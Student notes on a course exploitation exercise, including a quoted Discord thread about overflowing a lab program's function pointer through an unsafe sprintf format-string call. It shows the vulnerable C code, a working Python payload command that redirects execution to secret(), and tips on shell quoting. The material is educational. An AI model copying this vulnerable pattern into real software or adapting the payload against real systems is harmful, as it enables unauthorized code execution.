# Notes
1. Write the over flow in hex and in four bytes little-endian order such as Integer ```1``` as ```\x01\x00\x00\x00``` each section for one byte
2. Since Python2 and python3 use different method to encode and decode the string and bytes. Need to use
```
import sys
sys.stdout.buffer.write()
```
for write into the memory

3. \x09 Issue, quote from discord:
Scott Zeta — Yesterday at 15:26
Hey guys, I just found something I can not explain. My assignment requires me to exploit
void secret()
{
    setreuid(geteuid(), getegid());
    system("/bin/cat /home/q4/secret");
}
void lose()
{
    printf("Try again...\n");
}
int main(int argc, char **argv)
{
    // fp is function pointer
    struct
    {
        char buffer[1024];
        volatile unsigned int (*fp)();
    } locals;

    locals.fp = &lose;
    
    if (argc != 2)
    {
        printf("Usage: q4 <some string>\n");
        return -1;
    }
    if (strlen(argv[1]) > 100)
    {
        printf("Sorry the input string is too long...\n");
        return -1;
    }

    // use sprintf instead of strcpy
    // strcpy(locals.buffer, argv[1]);
    sprintf(locals.buffer, argv[1]);

    printf("Jumping to function at 0x%08x!!\n", (unsigned int)locals.fp);
    locals.fp();
    return 0;
}

I use GDB to locate the secret() is at 0x56556209. But my pay load
./run_me $(python -c "import sys; sys.stdout.buffer.write(b'%1024d' + b'\x09\x62\x55\x56')")
 has problem since x09 will be identified as Tab, and cause two input arguments.
I have no idea how to solve that, so I was trying some random numbers without intention. Then I found
./run_me $(python -c "import sys; sys.stdout.buffer.write(b'%1024d' + b'\x07\x62\x55\x56')")
 This one works and I got the secret!
Well, I mainly have two question.
1. what should I do if I want to write \x09, without been identified as ACII \t?
2. Why I can access the address 0x56556209 by 0x56556207?
Great thanks if anyone know some clues.

How to solve? Can not believe it is such simple!

samiko — Yesterday at 16:54
surround the input string with additional double-quotes and your shell will treat it as one argument, like this:
"$(python -c "...")"

samiko — Yesterday at 17:25
when you overwrite the return pointer you're basically changing where the program should jump to when it executes the return - x07 is two bytes off, so you'd still be jumping to an address relatively close to secret(), my guess is the program will execute whatever data is there as instructions (which just so happens didnt crash your program), and then it'd land on secret() 

samiko — Yesterday at 17:37
you can probably observe this in gdb by stepping through each instruction and looking at the instruction pointer register (%eip/%rip)
https://gist.github.com/rkubik/b96c23bd8ed58333de37f2b8cd052c30